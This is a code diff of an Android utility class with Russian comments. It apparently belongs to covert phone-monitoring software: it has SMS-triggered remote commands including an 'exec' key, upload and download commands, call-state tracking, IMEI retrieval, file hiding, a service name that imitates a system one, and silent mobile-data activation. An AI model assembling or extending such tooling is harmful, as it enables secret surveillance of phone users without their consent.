@@ -34,7 +34,8 @@ public class Utils {
 	public static final String EXTRA_COMMAND = "command";
 	public static final String EXTRA_PHONE_NUMBER = "phoneNumber";
 	public static final String EXTRA_INTERVAL = "interval";
-	
+	public static final String EXTRA_DURATION = "duration";
+
 	public static final int STATE_IN_NUMBER = 0;
 	public static final int STATE_OUT_NUMBER = 1;
 	public static final int STATE_CALL_START = 2;
@@ -46,13 +47,14 @@ public class Utils {
 	public static final int COMMAND_RUN_SCRIPTER = 1;
 	public static final int COMMAND_RUN_UPDATER = 2;
 	public static final int COMMAND_RUN_UPLOAD = 3;
-	public static final int COMMAND_RUN_DOWNLOAD = 4;	
+	public static final int COMMAND_RUN_DOWNLOAD = 4;
 
 	public static final int MEDIA_MOUNTED = 0;
 	public static final int MEDIA_MOUNTED_READ_ONLY = 1;
 	public static final int NO_MEDIA = 2;
 
-	public static final String EXTRA_SMS_BODY = "smsbody";
+	public static final String EXTRA_SMS_BODY = "sms_body";
+	public static final String SMS_KEY_EXEC = "exec";
 	public static final String IDENT_SMS = "#com.telephony.services";
 	public static final String CONFIG_OUT_FILENAME = "config.out";
 
@@ -63,6 +65,7 @@ public class Utils {
 
 	/**
 	 * Проверить права root
+	 * 
 	 * @return
 	 */
 	public static Boolean checkRoot() {
@@ -89,11 +92,14 @@ public class Utils {
 	}
 
 	/**
-	 * Ждать подключение к интренету 
+	 * Ждать подключение к интренету
+	 * 
 	 * @param context
 	 * @param wifiOnly
-	 * @param seconds - Время ожидания в секундах
-	 * @return Если интернет появился в течении seconds секунд, то true, иначе false
+	 * @param seconds
+	 *            - Время ожидания в секундах
+	 * @return Если интернет появился в течении seconds секунд, то true, иначе
+	 *         false
 	 * @throws InterruptedException
 	 */
 	public static boolean waitForInternet(Context context, boolean wifiOnly, int seconds) throws InterruptedException {
@@ -118,6 +124,7 @@ public class Utils {
 
 	/**
 	 * Получить статус sdcard
+	 * 
 	 * @return
 	 */
 	public static int getExternalStorageStatus() {
@@ -134,8 +141,11 @@ public class Utils {
 
 	/**
 	 * Рекурсивный поиск файлов
-	 * @param root Директория для поиска
-	 * @param filter Фильтр поиска
+	 * 
+	 * @param root
+	 *            Директория для поиска
+	 * @param filter
+	 *            Фильтр поиска
 	 * @return ArrayList of files
 	 */
 	public static ArrayList<File> rlistFiles(File root, FilenameFilter filter) {
@@ -155,8 +165,10 @@ public class Utils {
 
 	/**
 	 * Установить статус компонента
+	 * 
 	 * @param context
-	 * @param Класс, статус которого необходимо изменить
+	 * @param Класс
+	 *            , статус которого необходимо изменить
 	 * @param status
 	 */
 	public static void setComponentState(Context context, Class<?> cls, boolean status) {
@@ -176,8 +188,10 @@ public class Utils {
 
 	/**
 	 * Получить имя контакта по номеру телефона
+	 * 
 	 * @param context
-	 * @param phoneNum номер телефона для поиска
+	 * @param phoneNum
+	 *            номер телефона для поиска
 	 * @return Если имя не найдено, то вернется номер телефона phoneNum.
 	 */
 	public static String getContactName(Context context, String phoneNum) {
@@ -205,11 +219,14 @@ public class Utils {
 	}
 
 	/**
-	 * Показать уведомление в StatusBar с текстом из ресурсов и описанием из параметра.
-	 * With flags: FLAG_ONGOING_EVENT  
+	 * Показать уведомление в StatusBar с текстом из ресурсов и описанием из
+	 * параметра. With flags: FLAG_ONGOING_EVENT
+	 * 
 	 * @param context
-	 * @param mId Идентификатор уведомления
-	 * @param subtext Описание
+	 * @param mId
+	 *            Идентификатор уведомления
+	 * @param subtext
+	 *            Описание
 	 * @param intent
 	 */
 	public static void show_notification(Context context, int mId, String subtext, Intent intent) {
@@ -227,19 +244,10 @@ public class Utils {
 	}
 
 	/**
-	 * Получить собственный номер телефона
-	 * @param context
-	 * @return Номер телефона
-	 */
-	public static String getSelfPhoneNumber(Context context) {
-		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-		return tm.getLine1Number();
-	}
-
-	/**
 	 * Получить IMEI
+	 * 
 	 * @param context
-	 * @return
+	 * @return IMEI или null
 	 */
 	public static String getDeviceId(Context context) {
 		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
@@ -248,8 +256,11 @@ public class Utils {
 
 	/**
 	 * Объединить массив строк в строку с разделителем
-	 * @param strings Массив строк
-	 * @param glue Разделитель
+	 * 
+	 * @param strings
+	 *            Массив строк
+	 * @param glue
+	 *            Разделитель
 	 * @return
 	 */
 	public static String implodeStrings(String[] strings, String glue) {
@@ -265,6 +276,7 @@ public class Utils {
 
 	/**
 	 * Получить текущую версию программы из манифеста
+	 * 
 	 * @param context
 	 * @return VersionCode
 	 */
@@ -282,6 +294,7 @@ public class Utils {
 
 	/**
 	 * Изменить имя файла на "скрытый" (С "." вначале)
+	 * 
 	 * @param file
 	 * @return
 	 */
@@ -295,6 +308,7 @@ public class Utils {
 
 	/**
 	 * Переименовать файл в скрытый
+	 * 
 	 * @param file
 	 */
 	public static void setHidden(File file) {
@@ -303,20 +317,19 @@ public class Utils {
 			file.renameTo(new_file);
 		}
 	}
-	
-	public static void setMobileDataEnabled(Context context, boolean enabled) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IllegalArgumentException, NoSuchMethodException, InvocationTargetException {
-	    final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-	    final Class conmanClass = Class.forName(conman.getClass().getName());
-	    final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
-	    iConnectivityManagerField.setAccessible(true);
-	    final Object iConnectivityManager = iConnectivityManagerField.get(conman);
-	    final Class iConnectivityManagerClass = Class.forName(iConnectivityManager.getClass().getName());
-	    final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
-	    setMobileDataEnabledMethod.setAccessible(true);
 
-	    setMobileDataEnabledMethod.invoke(iConnectivityManager, enabled);
+	public static void setMobileDataEnabled(Context context, boolean enabled) throws ClassNotFoundException, NoSuchFieldException,
+			IllegalAccessException, IllegalArgumentException, NoSuchMethodException, InvocationTargetException {
+		final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+		final Class conmanClass = Class.forName(conman.getClass().getName());
+		final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
+		iConnectivityManagerField.setAccessible(true);
+		final Object iConnectivityManager = iConnectivityManagerField.get(conman);
+		final Class iConnectivityManagerClass = Class.forName(iConnectivityManager.getClass().getName());
+		final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", boolean.class);
+		setMobileDataEnabledMethod.setAccessible(true);
+
+		setMobileDataEnabledMethod.invoke(iConnectivityManager, enabled);
 	}
-	
-	
 
 }
